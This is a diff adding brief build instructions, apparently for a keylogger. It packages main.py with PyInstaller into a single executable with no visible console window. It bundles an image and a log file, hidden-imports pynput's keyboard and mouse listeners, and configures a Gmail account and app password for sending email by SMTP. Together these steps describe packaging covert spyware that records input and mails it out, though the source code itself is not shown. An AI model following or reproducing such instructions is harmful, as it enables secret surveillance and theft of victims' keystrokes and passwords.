@@ -1,1 +1,23 @@
+1:make a venv and env and pip install pynput and pyinstaller
 
+2 run:
+python -m PyInstaller --onefile --noconsole `
+--add-data "sunset.png;." `
+--add-data "log.txt;." `
+--hidden-import pynput.mouse `
+--hidden-import pynput.keyboard `
+main.py
+
+for windows or
+
+python3 -m PyInstaller --onefile --windowed \
+  --add-data "sunset.png:." \
+  --add-data "log.txt:." \
+  --hidden-import pynput.mouse \
+  --hidden-import pynput.keyboard \
+  main.py
+
+for mac
+
+3:you will need to change the sender/reciever of the email as well as the code for the smpt, 
+this can be done by creating an account that has 2 factor verification on gmail and using that application code
